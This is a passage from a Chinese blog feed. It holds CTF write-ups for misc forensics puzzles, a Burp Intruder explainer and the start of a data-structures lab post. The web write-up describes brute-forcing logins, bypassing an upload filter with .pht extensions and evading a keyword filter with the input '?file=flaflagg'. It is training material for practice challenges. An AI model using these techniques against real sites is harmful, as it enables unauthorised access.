    <content type="html"><![CDATA[<hr><blockquote><p>本篇文章为个人做题时的部分wp，如有错误，请联系我更正。</p></blockquote><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="最简单的misc-y1ng"><a href="#最简单的misc-y1ng" class="headerlink" title="最简单的misc-y1ng"></a>最简单的misc-y1ng</h2><p>题目是一个zip包，尝试解压出错，用AZR压缩包修复工具修复后，解压得到一个secret文件，由于没有后缀名，放入010editor查看，发现含有IHDR<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200323191150201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>可能是缺少文件头，加上png的文件头89504E47后成功打开图片。发现424A44…….等一列数字，猜测是十六进制，在线网站解密得到flag。附上网站：<a href="http://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">十六进制转文本</a></p><h2 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h2><p>题目是一个图片，直接打开打不开(我用的linux系统)，放到Windows下面可以打开。由此可推断是图片宽高错误，可根据CRC爆破宽高。附上Python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">filename = <span class="string">'test.png'</span></span><br><span class="line"><span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    all_b = f.read()</span><br><span class="line">    crc32key = int(all_b[<span class="number">29</span>:<span class="number">33</span>].hex(),<span class="number">16</span>)</span><br><span class="line">    data = bytearray(all_b[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">    n = <span class="number">4095</span>            <span class="comment">#理论上0xffffffff,但考虑到屏幕实际/cpu，0x0fff就差不多了</span></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> range(n):          <span class="comment">#高和宽一起爆破</span></span><br><span class="line">        width = bytearray(struct.pack(<span class="string">'&gt;i'</span>, w))     <span class="comment">#q为8字节，i为4字节，h为2字节</span></span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> range(n):</span><br><span class="line">            height = bytearray(struct.pack(<span class="string">'&gt;i'</span>, h))</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">                data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            crc32result = zlib.crc32(data)</span><br><span class="line">            <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">                print(<span class="string">"宽为："</span>,end=<span class="string">""</span>)</span><br><span class="line">                print(width)</span><br><span class="line">                print(<span class="string">"高为："</span>,end=<span class="string">""</span>)</span><br><span class="line">                print(height)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>根据跑出来的结果更改宽高<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200323191837340.png"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200323191931352.png"  alt="在这里插入图片描述"><br>此时就可正常打开图片，发现flag<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200323192004978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><blockquote><p>这个考点技巧就是图片在linux下不能打开(打开一片空白)，在Windows上可正常打开。</p></blockquote><h2 id="小姐姐-y1ng"><a href="#小姐姐-y1ng" class="headerlink" title="小姐姐-y1ng"></a>小姐姐-y1ng</h2><p>这题很奇怪，其实很简单，但好多人没写出来，当时我也刚开始没写出来，就是因为大家都把它想复杂化了。图片放到十六进制编辑器搜索BJD(因为这次比赛名称是BJDCTF)即可找到flag<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200323192332790.png"  alt="在这里插入图片描述"></p><h2 id="EasyBaBa"><a href="#EasyBaBa" class="headerlink" title="EasyBaBa"></a>EasyBaBa</h2><p>题目是一个图片，但却有19m，那一定是里面藏东西了。使用binwalk查看确实有东西，用foremost分离得到zip文件解压后是名字为里面都是出题人的jpg图片。一看大小39m，信他个鬼，肯定不是图片。放到十六进制编辑器发现文件头为RIFF后面又是AVI，更改后缀为.avi<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020032319300887.png"  alt="在这里插入图片描述"><br>得到一个视频文件，打开发现在第四秒左右有大量画面闪过，很可疑，用ae打开一帧一帧的查看发现多个二维码。扫描的结果是十六进制，转文本拼接后即可得到flag。但是有的二维码死活扫不上，只能截图用ps加深了下颜色才扫描成功。<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200323193452584.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70#pic_center"  alt="在这里插入图片描述"></p><blockquote><p>我也是问了一朋友才发现用ae等大型软件看那个二维码会更清楚点，推荐使用ae或pr。</p></blockquote><h2 id="圣火昭昭-y1ng"><a href="#圣火昭昭-y1ng" class="headerlink" title="圣火昭昭-y1ng"></a>圣火昭昭-y1ng</h2><p>这题刚开始没做出来，后来官方说出题人给的key出错了，才做出来。</p><p>在备注上发现新佛曰，在线解密<a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">新约佛论禅</a>得到gemlovecom，官方后来说去掉com,即为gemlove。<img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020032319365110.png"  alt="在这里插入图片描述"><br>根据gemlove猜测是某种加密，题目描述为：开局一张图，flag全靠<strong>猜</strong>，猜加重了，猜测是outguess加密。解密得flag。<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020032320082156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><blockquote><p>其实这题当时我也没想到是outguess加密，但加密的就是那几个，outguess，f5…..这种试一下就出来了。</p></blockquote><h2 id="TARGZ-y1ng"><a href="#TARGZ-y1ng" class="headerlink" title="TARGZ-y1ng"></a>TARGZ-y1ng</h2><p>题目是一个tar文件。题目描述为：哎？ 我的tar zxvf怎么不好使了？解压密码不需要爆破。猜测文件并不是tar文件。放到十六进制编辑器发现文件头是504B0304,这是zip文件头，也可用file命令发现这是一个zip文件。<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200323201251961.png"  alt="在这里插入图片描述"><br>改后缀名为zip，根据题目描述不需要密码，再看文件名很奇怪，尝试用文件名解密成功解密，但这题没有那么简单。后面解密都是用文件名解密，且解密得到的都是tar文件，需要更改后缀再解密。连续解密几次发现规律，应该得用脚本跑。<br>这里附上自己写的脚本（水平较菜，仅供参考）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">name = <span class="string">'hW1ES89jF'</span></span><br><span class="line">tmp=<span class="string">""</span> <span class="comment">#解压过的文件</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    fz = zipfile.ZipFile(name + <span class="string">'.tar.gz'</span>, <span class="string">'r'</span>)</span><br><span class="line">    fz.extractall(pwd=bytes(name, <span class="string">'utf-8'</span>))</span><br><span class="line">    tmp=name+<span class="string">".tar.gz"</span></span><br><span class="line">    os.remove(tmp)</span><br><span class="line">    name = fz.filelist[<span class="number">0</span>].filename[<span class="number">0</span>:<span class="number">9</span>]</span><br><span class="line">    fz.close(</span><br></pre></td></tr></table></figure><p>最后会报错(为了适应多种情况不加判断了)，出现flag文件</p><h2 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="Real_EasyBaBa"></a>Real_EasyBaBa</h2><p>题目是一个图片，binwalk下发现含有zip的结尾，但没有zip头<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200323204007962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>这里就推荐下010editor，里面的模板能直接看到图片结构<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200323204117635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>可以看到504BFFFF，将这以及以后的代码另存为一个zip文件并修改头为504B0304，解压后发现一个类似二维码的文档<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200323204240462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>看到有人博客写的是把#号变成1空格变成0，但其实当时我用qq就直接扫出来了，扫描结果是od -vtx1 ./draw.png | head -56 | tail -28，将draw.png替换为ezbb_r.jpg发现这个东西<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200323204858996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>当时我就是卡到这了，后来看别人的wp发现我们把ff高亮就会发现这就是flag。emm,脑洞很好，可惜我没想出来。<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020032320541535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总的来说这次杂项题目挺适合我们这种新手，但web题直接劝退，还是自己太菜，一起加油吧！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;本篇文章为个人做题时的部分wp，如有错误，请联系我更正。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;杂项&quot;&gt;&lt;a href=&quot;#杂项&quot; class=&quot;headerlink&quot; title=&quot;杂项&quot;&gt;&lt;/a&gt;杂项&lt;/h1&gt;&lt;h2 i
      
    
    </summary>
    
    
      <category term="CTF-杂项" scheme="http://yoursite.com/categories/CTF-%E6%9D%82%E9%A1%B9/"/>
    
    
  </entry>
  
  <entry>
    <title>百度杯CTF比赛 九月场——123</title>
    <link href="http://yoursite.com/2020/03/20/%E7%99%BE%E5%BA%A6%E6%9D%AFCTF%E6%AF%94%E8%B5%9B%20%E4%B9%9D%E6%9C%88%E5%9C%BA%E2%80%94%E2%80%94123/"/>
    <id>http://yoursite.com/2020/03/20/%E7%99%BE%E5%BA%A6%E6%9D%AFCTF%E6%AF%94%E8%B5%9B%20%E4%B9%9D%E6%9C%88%E5%9C%BA%E2%80%94%E2%80%94123/</id>
    <published>2020-03-20T07:45:00.000Z</published>
    <updated>2020-04-07T09:09:22.441Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200320135558416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h1 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h1><p>打开页面是一个登录页面，查看源码发现提示语句<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200320135703544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>访问user.php发现界面为空，此时尝试打开备份文件，发现user.php.bak，下载后发现用户名，根据上述源码提示采用burpsuite爆破，配置如下，注意<strong>选取Clusterbomb模式</strong>（因为要尝试多个payload，详细见：<a href="https://blog.csdn.net/zss192/article/details/104988180" target="_blank" rel="noopener">Burp Suite Intruder4种攻击类型</a>）<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200320140003431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>三个payload如下所示<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200320140243543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200320140320740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200320140409753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>经过一番爆破后发现两个有用的信息<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200320140541887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>选取其中一个登录，发现依然是空白，查看源码发现<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200320140638985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>我们可以看到提示这个表单存在漏洞，所以我们可以按F12然后把表单取消注释（选中&lt;center&gt;右键选择编辑html）<br>尝试上传一个正常jpg图片提示文件名不合法，猜想这里并不是真的文件上传，并不是用菜刀连上找flag。只是构造文件名，并且上传到服务器成为可执行文件便可通过。<br>Apache 配置文件中会有</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.+.ph(p[345]?|t|tml</span><br><span class="line">.+\.phps$</span><br></pre></td></tr></table></figure><p><strong>文件名满足即可被当做php解析，也就是说php3，php4，php5，pht，phtml,phps都是可以被解析的。</strong><br>尝试.pht发现返回view.php<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200320141121819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><blockquote><p>其实这个view.php通过文件扫描也可能被找到，我用的dirsearch就发现这个文件<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200320141314761.png"  alt="在这里插入图片描述"></p></blockquote><p>进入view.php,提示file? ,应该是file传参<br>构造?file=flag.php<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200320142106604.png"  alt="在这里插入图片描述"><br>提示flag被过滤，尝试双写大小写也不行，最终发现构造</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=flaflagg</span><br></pre></td></tr></table></figure><p>发现flag<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200320142234714.png"  alt="在这里插入图片描述"><br>吐槽一句这个file也太迷惑人了，我以为必须是个文件才行。。。</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题涉及到了文件泄露、爆破、文件上传绕过、关键字绕过。非常好的一道题目，在此特别记录，文中如有错误，请联系我更正。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/&quot; class=&quot;lazyload&quot; data-src=&quot;https://img-blog.
      
    
    </summary>
    
    
      <category term="CTF-WEB" scheme="http://yoursite.com/categories/CTF-WEB/"/>
    
    
  </entry>
  
  <entry>
    <title>Burp Suite Intruder4种攻击类型</title>
    <link href="http://yoursite.com/2020/03/20/Burp%20Suite%20Intruder4%E7%A7%8D%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B/"/>
    <id>http://yoursite.com/2020/03/20/Burp%20Suite%20Intruder4%E7%A7%8D%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B/</id>
    <published>2020-03-20T05:45:00.000Z</published>
    <updated>2020-04-07T15:12:10.269Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="Sniper（狙击手模式）"><a href="#Sniper（狙击手模式）" class="headerlink" title="Sniper（狙击手模式）"></a>Sniper（狙击手模式）</h2><p>狙击手模式只能使用一组payload，它一次只使用一个payload位置。假设你标记了A位置和B位置，payload为m,n。那么会形成下列4种组合。<br>第几次攻击     | A位置数值 | B位置数值<br>——– | —– |——<br>1 | m |原来的数值<br>2| n |原来的数值<br>3 |原来的数值 | m<br>4  |原来的数值| n</p><h2 id="Battering-ram（攻城锤模式）"><a href="#Battering-ram（攻城锤模式）" class="headerlink" title="Battering ram（攻城锤模式）"></a>Battering ram（攻城锤模式）</h2><p>攻城锤模式与狙击手模式类似的地方是，同样只能使用一个payload集合，不同的地方在于每次攻击都是<strong>替换所有payload标记位置</strong>，而狙击手模式每次只能替换一个payload标记位置。如下述所示<br>第几次攻击     | A位置数值 | B位置数值<br>——– | —– |——<br>1 | m |m<br>2| n |n</p><h2 id="Pitchfork（草叉模式）"><a href="#Pitchfork（草叉模式）" class="headerlink" title="Pitchfork（草叉模式）"></a>Pitchfork（草叉模式）</h2><p>草叉模式允许使用多组payload组合。假设有两个位置“A”和“B”，payload组合1的值为“m”和“n”，payload组合2的值为“1”和“2”，如下所示：<br>第几次攻击     | A位置数值 | B位置数值<br>——– | —– |——<br>1 | m |1<br>2| n |2</p><h2 id="Cluster-bomb（集束炸弹模式）"><a href="#Cluster-bomb（集束炸弹模式）" class="headerlink" title="Cluster bomb（集束炸弹模式）"></a>Cluster bomb（集束炸弹模式）</h2><p>集束炸弹模式允许使用多组payload组合，与草叉模式不同的是集束炸弹模式会对payload组进行笛卡尔积。若依然和草叉模式payload相同时，如下所示<br>第几次攻击     | A位置数值 | B位置数值<br>——– | —– |——<br>1 | m |1<br>2| m |2<br>3| n |1<br>4| n |2</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h2 id=&quot;Sniper（狙击手模式）&quot;&gt;&lt;a href=&quot;#Sniper（狙击手模式）&quot; class=&quot;headerlink&quot; title=&quot;Sniper（狙击手模式）&quot;&gt;&lt;/a&gt;Sniper（狙击手模式）&lt;/h2&gt;&lt;p&gt;狙击手模式只能使用一组payload，它一
      
    
    </summary>
    
    
      <category term="CTF-WEB" scheme="http://yoursite.com/categories/CTF-WEB/"/>
    
    
  </entry>
  
  <entry>
    <title>实验一 顺序表的操作</title>
    <link href="http://yoursite.com/2020/03/19/%E5%AE%9E%E9%AA%8C%E4%B8%80%20%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E6%93%8D%E4%BD%9C/"/>
    <id>http://yoursite.com/2020/03/19/%E5%AE%9E%E9%AA%8C%E4%B8%80%20%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E6%93%8D%E4%BD%9C/</id>
    <published>2020-03-19T06:45:00.000Z</published>
    <updated>2020-04-07T09:09:23.781Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="实验性质：设计性实验"><a href="#实验性质：设计性实验" class="headerlink" title="实验性质：设计性实验"></a>实验性质：设计性实验</h2><h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><p>编程实现顺序表的以下基本操作：建立顺序表，修改顺序表，插入顺序表，删除顺序表。<br>采用顺序表结构编程实现：两个集合的运算：交集/并集/差集。</p><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>通过该实验，深入理解顺序表的逻辑结构、物理结构等概念，掌握顺序表基本操作的编程实现，注意顺序表插入、删除等操作过程中数据元素的移动现象，学生编写程序时，要考虑程序的健壮性，熟练掌握通过函数参数返回函数结果的办法。</p><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><p>编程实现顺序表下教材第二章定义的线性表的基本操作，最好用菜单形式对应各个操作，使其变成一个完整的小软件。</p><h2 id="参考界面"><a href="#参考界面" class="headerlink" title="参考界面"></a>参考界面</h2><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200319172016748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h2 id="验收-测试用例"><a href="#验收-测试用例" class="headerlink" title="验收/测试用例"></a>验收/测试用例</h2><p>通过菜单调用各个操作，测试点：</p><ul><li><p>插入数据(位置， 数据)，要测插入位置不合法的情况（0,1）、（2,1），正确插入4个数据（1，2）、（1，1）、（3,3）</p><ul><li>显示顺序表中的数据，屏幕输出1， 2， 3；</li></ul></li><li><p>判空，屏幕输出顺便表非空；</p></li><li><p>顺便表长度，屏幕输出3；</p></li><li><p>获取指定位置元素，要测指定位置在【1，3】范围之外的情况和之内的情况；</p></li><li><p>定位，输入：4， 输出：不存在，输入2，输出位置为2；</p></li><li><p>求直接前驱，要测求第一个元素的前驱、不存在顺序表中的元素的直接前驱，其他元素的直接前驱；</p></li><li><p>求直接后继，要测最后一个元素的后继、不存在顺序表中的元素的直接后继，其他元素的直接后继；</p></li><li><p>删除，要测位置在【1，3】范围之外的情况和之内的情况；</p></li><li><p>清空操作后再测长度；</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span 